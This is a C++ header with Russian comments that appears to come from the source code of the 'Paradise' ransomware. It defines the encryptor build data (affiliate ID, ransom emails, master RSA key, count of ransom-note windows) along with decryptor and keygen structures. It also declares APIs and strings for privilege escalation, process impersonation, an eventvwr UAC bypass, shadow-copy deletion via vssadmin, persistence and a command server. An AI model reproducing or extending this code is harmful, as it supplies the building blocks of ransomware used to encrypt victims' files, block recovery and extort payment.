#pragma once
#include "Utils.h"
#include <TlHelp32.h>
#include <WinInet.h>
#include <Psapi.h>
#include <WinSock.h>
#include <stdio.h>
#include <sal.h>
#include <Shlwapi.h>
#include <sys/stat.h>
#include <winternl.h>

#define ENC_STR_A(str) (str)
#define END_ENC_STR

#define HTTPS 0

#define BLOCK_SIZE 10240 // 10 кб 
#define WC_ENCKEY_LEN 256 // rsa-2048 (байт = 8 бит)
#define WC_SIG_LEN 9 // длина нашей строчки "PARADISE*" без '\0'
#define WC_DATA_OFFSET  WC_SIG_LEN + WC_ENCKEY_LEN + 4 + 4
#define WC_AES_KEY_LEN 16 // aes-128 ключ (байт = 8 бит)
#define RSA2048BIT_KEY (2048 << 16)



// Информация для шифровальщика
struct Build_Data
{
	char build_id[10]; // айди работника
	char extension[30];
	char email1[128];
	char email2[128];
	char appdata_name[50]; // Название файла при нахождении в appdata.
	BYTE public_key[2048]; // Здесь будет сгенерированный мастер-РСА паблик, которым будет зашифрован персональный-РСА приват.
	DWORD public_key_len; // Длина мастер-РСА паблик.
	BOOL is_one_block; // 1 - шифруется один блок размером BLOCK_SIZE, 0 - весь файл
	BYTE windowsNum; // Количество окон-записок.
};

// Информация для декриптора.
struct Decrypt_Data
{
	BOOL is_one_block; // 1 - шифруется один блок размером BLOCK_SIZE, 0 - весь файл
	char extension[30];
};

// Информация для кейгена.
struct Keygen_Data
{
	char worker_id[10]; // айди работника
	char email[128]; // основное мыло
};

typedef struct _key_hdr_t {
	PUBLICKEYSTRUC hdr; // информация о ключе
	DWORD          len; // длина ключа
	BYTE           key[WC_AES_KEY_LEN]; // AES-128
} key_hdr;

typedef struct _wc_aes_key_t {
	HCRYPTKEY key; // rsa ключ от cryptoapi
	BYTE      enc[WC_ENCKEY_LEN]; // зашифрованный ключ для aes
} aes_key_t;


typedef struct _ThreadArg
{
	HANDLE hThread;
	HANDLE hToken;
}ThreadArg;

typedef struct _CLIENT_ID {
	DWORD UniqueProcess;
	DWORD UniqueThread;
} CLIENT_ID;

typedef struct _THREAD_BASIC_INFORMATION {
	NTSTATUS                ExitStatus;
	PVOID                   TebBaseAddress;
	CLIENT_ID               ClientId;
	KAFFINITY               AffinityMask;
	LONG					Priority;
	LONG					BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

#define ThreadBasicInformation 0

namespace Types
{
	typedef NTSTATUS(WINAPI* T_RtlDecompressBuffer)
	(
		USHORT CompressionFormat,
		PUCHAR UncompressedBuffer,
		ULONG UncompressedBufferSize,
		PUCHAR CompressedBuffer,
		ULONG CompressedBufferSize,
		PULONG FinalUncompressedSize
	);
	typedef NTSTATUS(__stdcall* T_NtImpersonateThread)
	(
		HANDLE ThreadHandle,
		HANDLE ThreadToImpersonate,
		PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService
	);
	typedef NTSTATUS(NTAPI* T_NtQueryInformationThread)
		 (
			  IN HANDLE               ThreadHandle,
			  IN LONG					ThreadInformationClass,
			  OUT PVOID               ThreadInformation,
			  IN ULONG                ThreadInformationLength,
			  OUT PULONG              ReturnLength OPTIONAL);
	typedef NTSTATUS(*T_RtlGetVersion)
		 (
			  _Out_ PRTL_OSVERSIONINFOW lpVersionInformation
			  );
	typedef NTSTATUS(NTAPI* T_NtSetInformationProcess)
	(
		IN HANDLE						ProcessHandle,
		IN ULONG						ProcessInformationClass,
		IN PVOID						ProcessInformation,
		IN ULONG						ProcessInformationLength
	);
	typedef long (WINAPI *T_RtlSetProcessIsCritical)
	(
		IN BOOLEAN    bNew,
		OUT BOOLEAN    *pbOld,
		IN BOOLEAN    bNeedScb
	);
	typedef NTSTATUS (NTAPI* T_RtlAdjustPrivilege)
	(
		ULONG    Privilege,     //[In]    Privilege index to change.
		BOOLEAN  Enable,        //[In]    If TRUE, then enable the privilege otherwise disable.
		BOOLEAN  CurrentThread, //[In]    If TRUE, then enable in calling thread, otherwise process.
		PBOOLEAN Enabled        //[Out]   Whether privilege was previously enabled or disabled.
	);
	typedef NTSTATUS (WINAPI *T_NtQueryInformationProcess)
	(
		HANDLE ProcessHandle,
		LPVOID ProcessInformationClass,
		PVOID  ProcessInformation,
		ULONG  ProcessInformationLength,
		PULONG ReturnLength
	);
	typedef int(__cdecl* T_fseek)
	(
			_Inout_ FILE* _Stream,
			_In_    long  _Offset,
			_In_    int   _Origin
	);
	typedef  FILE* (__cdecl* T_fopen)
	(
			_In_z_ char const* _FileName,
			_In_z_ char const* _Mode
	);
	typedef int(__cdecl* T_fclose)
	(
			_Inout_ FILE* _Stream
	);
	typedef size_t(__cdecl* T_fread)
	(
			void*  _Buffer,
			_In_                                             size_t _ElementSize,
			_In_                                             size_t _ElementCount,
			_Inout_                                          FILE*  _Stream
	);
	typedef int(__cdecl* T__stat64)
	(
			_In_z_ char const*     _FileName,
			_Out_  struct _stat64* _Stat
	);
	typedef void (__cdecl* T_srand)(unsigned int seed);
	typedef time_t(__cdecl* T_time)(time_t *t);
	typedef int(__cdecl* T_rand)(void);
}

namespace Funcs
{
	extern Types::T_RtlDecompressBuffer			   pRtlDecompressBuffer;
	extern Types::T_NtImpersonateThread			   pNtImpersonateThread;
	extern Types::T_NtQueryInformationThread	   pNtQueryInformationThread;
	extern Types::T_RtlGetVersion				   pRtlGetVersion;
	extern Types::T_NtSetInformationProcess		   pNtSetInformationProcess;
	extern Types::T_RtlAdjustPrivilege			   pRtlAdjustPrivilege;
	extern Types::T_RtlSetProcessIsCritical		   pRtlSetProcessIsCritical;
	extern Types::T_NtQueryInformationProcess      pNtQueryInformationProcess;
	extern Types::T_fread						   _fread;
	extern Types::T_fclose						   _fclose;
	extern Types::T_fseek						   _fseek;
	extern Types::T_fopen						   _fopen;
	extern Types::T__stat64						   stat64;
	extern Types::T_srand							_srand;
	extern Types::T_time								_time;
	extern Types::T_rand								_rand;
}

namespace Strs
{
	extern char *server;
	extern char *version;

	// sniffers
	/*extern char *windump;
	extern char *fiddler;
	extern char *wireshark;
	extern char *capsa;*/

	// strings
	extern char *readme;
	extern char *nodeText;
	extern char *wmic;
	extern char *wmic_cmd;
	extern char *vssadmin_cmd;
	extern char *req_fmt;
	extern char *delimiter;
	extern char *base64_chars;
	extern char *uac1;
	extern char *uac2;
	extern char *post;
	extern char *russia;
	extern char *open;
	extern char *eventvwr_path;
	extern char *key;
	extern char *ip2;
	extern char *content_type;
	extern char *info_fmt;
	extern char *api_link;
	extern char *date_fmt;
	extern char *firstMail;
	extern char *secondMail;
	extern char *image;
	extern char *id;
	extern char *guidfmt;
	extern char *diskC;
	extern char *autostartPath;
	extern char *lnk;
	extern char *trump;
	extern char *paradise_png;
	extern char *paradise_key;
	extern char *paradise_sig;
	extern char *keyName;
	extern char *chromeFolder;
	extern char *chrome;
	extern char *firefoxFolder;
	extern char *firefox;
	extern char *iexploreFolder;
	extern char *iexplore;
	extern char *operaFolder;
	extern char *opera;
	extern char *eventvwr1;
	extern char *eventvwr2;
	extern char *publicKey;
	extern char *cmd;
}

// Инициализация строк и функций
void InitApi();
// Получает строку "ntdll.dll" из PEB. Подробнее внутри.
LPSTR GetEncryptKey();